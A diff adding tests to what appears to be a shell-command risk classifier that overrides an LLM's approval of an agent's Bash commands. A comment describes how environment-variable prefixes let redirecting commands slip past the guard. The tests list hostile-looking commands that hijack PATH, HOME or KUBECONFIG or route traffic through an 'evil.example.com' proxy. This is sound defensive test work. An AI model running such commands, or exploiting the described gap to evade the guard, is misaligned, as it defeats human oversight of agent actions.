@@ -466,3 +466,45 @@ describe('RISK_BANDS / riskBandRank / riskBandAtLeast', () => {
     expect(riskBandAtLeast('low', 'critical')).toBe(false);
   });
 });
+
+/**
+ * #1004 re-review. `unwrapCommand` stripped EVERY `NAME=value` token while
+ * looking for the head command, so `HOME=/tmp/evilhome git commit` graded
+ * `moderate` — byte-identical to a plain `git commit`. `enforceRiskCeiling`
+ * only acts on `high`, so the guard whose entire job is to override a wrong LLM
+ * approval could never fire on the very shape the deterministic matcher had
+ * just been taught to refuse.
+ *
+ * The two now share one predicate (`isPeelableAssignment`, shell-safety.ts).
+ * This is the fourth time in this module that two consumers deriving the same
+ * judgement from two different pieces of code produced a hole.
+ */
+describe('#1004 an assignment that redirects execution grades high', () => {
+  const high = [
+    'HOME=/tmp/evilhome git commit -m x',
+    'XDG_CONFIG_HOME=/tmp/e git commit -m x',
+    'KUBECONFIG=/tmp/evil.yaml kubectl get pods',
+    'PATH=/evil/bin git status',
+    'HTTPS_PROXY=evil.example.com:8080 gh pr view 1',
+    'ALL_PROXY=evil.example.com:1080 gh issue list',
+    'D=/tmp/e git status',
+  ];
+  for (const command of high) {
+    test(JSON.stringify(command), () => expect(classifyRisk('Bash', { command })).toBe('high'));
+  }
+
+  // The band must not inflate for ordinary commands, or the ceiling escalates
+  // everything and stops meaning anything.
+  const moderate = [
+    'git commit -m x',
+    'ACC=da8d7a2a868 git status',
+    'V=1.2.3 bun test',
+    'git commit -m FOO=bar',
+    'grep -n A=B file.txt',
+    'git log --format=%H',
+  ];
+  for (const command of moderate) {
+    test(`stays moderate: ${JSON.stringify(command)}`, () =>
+      expect(classifyRisk('Bash', { command })).toBe('moderate'));
+  }
+});
